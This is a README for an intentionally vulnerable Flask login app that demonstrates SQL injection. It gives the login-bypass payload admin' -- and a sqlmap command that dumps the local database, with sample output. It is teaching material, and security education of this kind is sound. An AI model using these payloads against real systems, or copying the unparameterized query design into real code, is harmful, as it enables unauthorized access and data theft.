# SQL Injection Vulnerable Web Application 

This project demonstrates a simple Python web application using Flask that is vulnerable to SQL Injection (SQLi).  
The application accepts user input via a login form and directly uses it in SQL queries without proper sanitization, making it vulnerable to SQLi attacks.  

## Why It Is Vulnerable  
The vulnerability exists because the application directly inserts user input into SQL queries without using parameterized queries or proper input validation.  
This allows an attacker to manipulate the SQL query and access or modify the database.  

## Steps to Launch the App and Test the Vulnerability  

1. **Create the SQLite Database**    

Create a SQLite database and populate it with some sample user data:  


```sh
python3 init_db.py
```  

Run this script to initialize the database.  


2. **Launch Web App**   

```sh
python3 app.py
```  

3. **Access the Application**  
Open your web browser and navigate to `http://127.0.0.1:5000`.  

4. **Test the Vulnerability**  

  - Username: `admin`
 
  - Password: `test`

  - Login failed.  
 
<br/>

  - Username: `admin' --`

  - Password: (anything)
 
  - This comment (`--`) makes the rest of the SQL query a comment, bypassing the password check.  
 
5. **Launch SQLmap to Automate Exploitation**

Install [*SQLmap*](https://github.com/sqlmapproject/sqlmap) and launch it:  


```sh
sqlmap -u "http://127.0.0.1:5000/login" --data="username=admin&password=admin123" --dump
```

SQLmap will exploit the SQL injection vulnerability and dump the database contents, here is the output:  
```sh
Database: <current>
Table: users
[2 entries]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | admin123 | admin    |
| 2  | user123  | user     |
+----+----------+----------+
```

### Explanation 
In `app.py`, the user input from the login form is directly inserted into the SQL query without sanitization.  
This makes the application vulnerable to SQL injection, allowing attackers to manipulate the query and access or modify the database.  
This PoC illustrates the dangers of SQL Injection and underscores the importance of using parameterized queries and proper input validation in web applications.  